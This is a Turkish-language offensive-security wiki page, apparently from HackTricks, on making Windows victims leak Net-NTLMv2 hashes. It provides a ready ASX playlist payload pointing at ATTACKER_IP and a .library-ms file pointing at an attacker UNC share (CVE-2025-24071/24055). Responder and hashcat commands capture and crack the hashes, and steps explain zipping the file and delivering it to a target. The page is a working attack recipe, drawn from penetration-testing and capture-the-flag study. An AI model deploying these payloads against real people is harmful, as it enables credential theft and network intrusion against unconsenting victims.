# NTLM creds çalmak için yerler

{{#include ../../banners/hacktricks-training.md}}

**Bu harika fikirleri inceleyin: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — çevrimiçi bir microsoft word dosyasının indirilmesinden ntlm leak kaynağına: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md ve [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player oynatma listeleri (.ASX/.WAX)

Eğer hedefin sizin kontrolünüzdeki bir Windows Media Player oynatma listesini açmasını veya önizlemesini sağlayabilirseniz, girdiyi bir UNC yoluna yönlendirerek Net‑NTLMv2 leak edebilirsiniz. WMP, referans verilen medyayı SMB üzerinden almaya çalışacak ve otomatik olarak kimlik doğrulaması yapacaktır.

Örnek payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Toplama ve kırma akışı:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP içindeki .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, .library-ms dosyalarını ZIP arşivi içinden doğrudan açıldığında güvensiz şekilde işler. Kütüphane tanımı uzak bir UNC yoluna işaret ediyorsa (ör. \\attacker\share), ZIP içindeki .library-ms dosyasına göz atmak veya başlatmak Explorer'ın UNC'yi keşfetmesine ve saldırgana NTLM kimlik doğrulaması göndermesine neden olur. Bu, offline kırılabilecek veya potansiyel olarak relayed edilebilecek bir NetNTLMv2 sağlar.

Saldırgan UNC'sine işaret eden minimal .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
İşlem adımları
- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname'inizi ayarlayın).
- ZIP'leyin (on Windows: Send to → Compressed (zipped) folder) ve ZIP'i hedefe teslim edin.
- Bir NTLM capture listener çalıştırın ve kurbanın ZIP içinden .library-ms'i açmasını bekleyin.


## Referanslar
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
